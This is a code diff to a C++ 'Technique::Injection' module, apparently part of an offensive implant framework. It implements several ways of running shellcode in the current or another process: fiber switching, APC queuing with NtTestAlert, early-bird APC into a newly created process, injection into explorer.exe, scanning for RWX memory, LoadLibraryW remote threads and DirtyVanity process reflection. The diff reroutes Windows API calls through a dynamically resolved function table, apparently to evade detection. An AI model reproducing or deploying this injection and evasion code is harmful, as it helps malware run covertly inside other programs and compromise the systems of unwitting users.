@@ -97,9 +97,9 @@ namespace Technique::Injection
         SIZE_T dwBufferSize = bytes.size();
 
         // Convert the current thread into a fiber.
-        PVOID mainFiber = ConvertThreadToFiber(nullptr);
+        PVOID mainFiber = pProcs->lpConvertThreadToFiber(nullptr);
 
-        LPVOID scAddr = VirtualAlloc(
+        LPVOID scAddr = pProcs->lpVirtualAlloc(
             NULL,
             dwBufferSize,
             MEM_COMMIT,
@@ -107,8 +107,8 @@ namespace Technique::Injection
         );
         memcpy(scAddr, lpBuffer, dwBufferSize);
 
-        PVOID scFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)scAddr, NULL);
-        SwitchToFiber(scFiber);
+        PVOID scFiber = pProcs->lpCreateFiber(0, (LPFIBER_START_ROUTINE)scAddr, NULL);
+        pProcs->lpSwitchToFiber(scFiber);
 
         return TRUE;
     }
@@ -124,16 +124,16 @@ namespace Technique::Injection
         LPVOID lpBuffer = (LPVOID)bytes.data();
         SIZE_T dwBufferSize = bytes.size();
 
-        MY_NTSTATUS testAlert = (MY_NTSTATUS)(GetProcAddress(
-            GetModuleHandleA("ntdll"),
+        MY_NTSTATUS testAlert = (MY_NTSTATUS)(pProcs->lpGetProcAddress(
+            pProcs->lpGetModuleHandleA("ntdll"),
             "NtTestAlert"
         ));
 
-        LPVOID scAddr = VirtualAlloc(nullptr, dwBufferSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-        WriteProcessMemory(GetCurrentProcess(), scAddr, lpBuffer, dwBufferSize, nullptr);
+        LPVOID scAddr = pProcs->lpVirtualAlloc(nullptr, dwBufferSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        pProcs->lpWriteProcessMemory(NtCurrentProcess(), scAddr, lpBuffer, dwBufferSize, nullptr);
 
         PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)scAddr;
-        QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), 0);
+        pProcs->lpQueueUserAPC((PAPCFUNC)apcRoutine, NtCurrentThread(), 0);
         testAlert();
 
         return TRUE;
@@ -150,7 +150,7 @@ namespace Technique::Injection
         STARTUPINFO si = {0};
         PROCESS_INFORMATION pi = {0};
 
-        if (!CreateProcessW(
+        if (!pProcs->lpCreateProcessW(
             nullptr,
             const_cast<LPWSTR>(wTargetProcess.c_str()),
             nullptr,
@@ -178,8 +178,8 @@ namespace Technique::Injection
         );
         if (!lpBaseAddr)
         {
-            CloseHandle(hThread);
-            CloseHandle(hProcess);
+            pProcs->lpCloseHandle(hThread);
+            pProcs->lpCloseHandle(hProcess);
             return FALSE;
         }
 
@@ -193,12 +193,12 @@ namespace Technique::Injection
             dwBufferSize,
             nullptr
         )) {
-            QueueUserAPC((PAPCFUNC)apcRoutine, hThread, 0);
-            ResumeThread(hThread);
+            pProcs->lpQueueUserAPC((PAPCFUNC)apcRoutine, hThread, 0);
+            pProcs->lpResumeThread(hThread);
         }
 
-        CloseHandle(hThread);
-        CloseHandle(hProcess);
+        pProcs->lpCloseHandle(hThread);
+        pProcs->lpCloseHandle(hProcess);
 
         return TRUE;
     }
@@ -210,7 +210,7 @@ namespace Technique::Injection
         LPVOID lpBuffer = (LPVOID)bytes.data();
         SIZE_T dwBufferSize = bytes.size();
 
-        HANDLE hEvent = CreateEvent(nullptr, FALSE, TRUE, nullptr);
+        HANDLE hEvent = pProcs->lpCreateEventW(nullptr, FALSE, TRUE, nullptr);
         if (!hEvent)
         {
             return FALSE;
@@ -309,7 +309,7 @@ namespace Technique::Injection
             return FALSE;
         }
 
-        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+        HANDLE hSnap = pProcs->lpCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
         Thread32First(hSnap, &te32);
 
         HANDLE hThread;
@@ -490,12 +490,12 @@ namespace Technique::Injection
         LPVOID lpBuffer = (LPVOID)bytes.data();
         SIZE_T dwBufferSize = bytes.size();
 
-        HWND hWindow = FindWindow(L"Shell_TrayWnd", nullptr);
+        HWND hWindow = pProcs->lpFindWindowW(L"Shell_TrayWnd", nullptr);
         if (!hWindow)
             return FALSE;
 
         DWORD dwPID;
-        if (GetWindowThreadProcessId(hWindow, &dwPID) == 0)
+        if (pProcs->lpGetWindowThreadProcessId(hWindow, &dwPID) == 0)
         {
             System::Handle::HandleClose(pProcs, hWindow);
             return FALSE;
@@ -563,12 +563,12 @@ namespace Technique::Injection
         SIZE_T dwBufferSize = bytes.size();
 
         // Find a window for explorer.exe
-        HWND hWindow = FindWindow(L"Shell_TrayWnd", nullptr);
+        HWND hWindow = pProcs->lpFindWindowW(L"Shell_TrayWnd", nullptr);
         if (!hWindow)
             return FALSE;
 
         DWORD dwPID;
-        if (GetWindowThreadProcessId(hWindow, &dwPID) == 0)
+        if (pProcs->lpGetWindowThreadProcessId(hWindow, &dwPID) == 0)
         {
             System::Handle::HandleClose(pProcs, hWindow);
             return FALSE;
@@ -738,7 +738,7 @@ namespace Technique::Injection
         BOOL bResult;
         NTSTATUS status;
 
-        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        HANDLE hSnapshot = pProcs->lpCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if (hSnapshot == INVALID_HANDLE_VALUE)
         {
             return FALSE;
@@ -747,7 +747,7 @@ namespace Technique::Injection
         PROCESSENTRY32 pe = {0};
         pe.dwSize = sizeof(PROCESSENTRY32);
 
-        bResult = Process32First(hSnapshot, &pe);
+        bResult = pProcs->lpProcess32FirstW(hSnapshot, &pe);
         if (!bResult)
         {
             System::Handle::HandleClose(pProcs, hSnapshot);
@@ -771,7 +771,7 @@ namespace Technique::Injection
             if (hProcess)
             {
                 // Check RWX
-                while (VirtualQueryEx(hProcess, lpAddr, &m, sizeof(m)))
+                while (pProcs->lpVirtualQueryEx(hProcess, lpAddr, &m, sizeof(m)))
                 {
                     // status = CallSysInvoke(
                     //     &pProcs->sysNtQueryVirtualMemory,
@@ -829,7 +829,7 @@ namespace Technique::Injection
             if (bFound)
                 break;
             else
-                bResult = Process32Next(hSnapshot, &pe);
+                bResult = pProcs->lpProcess32NextW(hSnapshot, &pe);
         }
 
         System::Handle::HandleClose(pProcs, hSnapshot);
@@ -1003,8 +1003,8 @@ namespace Technique::Injection
             return FALSE;
         }
 
-        PTHREAD_START_ROUTINE pThreadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(
-            GetModuleHandle(TEXT("Kernel32")),
+        PTHREAD_START_ROUTINE pThreadRoutine = (PTHREAD_START_ROUTINE)pProcs->lpGetProcAddress(
+            pProcs->lpGetModuleHandleA("Kernel32"),
             "LoadLibraryW"
         );
 
@@ -1108,7 +1108,7 @@ namespace Technique::Injection
         //     dwPID,
         //     PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE
         // );
-        HANDLE hProcess = OpenProcess(
+        HANDLE hProcess = pProcs->lpOpenProcess(
             PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE,
             TRUE,
             dwPID
@@ -1132,8 +1132,6 @@ namespace Technique::Injection
             return FALSE;
         }
 
-        Stdout::DisplayMessageBoxA("VirtualMemoryAllocate OK", "DirtyVanity");
-
         if (!System::Process::VirtualMemoryWrite(
             pProcs,
             hProcess,
@@ -1145,8 +1143,6 @@ namespace Technique::Injection
             System::Handle::HandleClose(pProcs, hProcess);
             return FALSE;
         }
-
-        Stdout::DisplayMessageBoxA("VirtualMmeoryWrite OK", "DirtyVanity");
 
         RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = {0};
         NTSTATUS status = CallSysInvoke(
@@ -1165,8 +1161,7 @@ namespace Technique::Injection
             return FALSE;
         }
 
-        Stdout::DisplayMessageBoxA("RtlCreateProcessREflection OK", "DirtyVanity");
-
+        System::Handle::HandleWait(pProcs, hProcess, FALSE, nullptr);
         System::Handle::HandleClose(pProcs, hProcess);
 
         return TRUE;
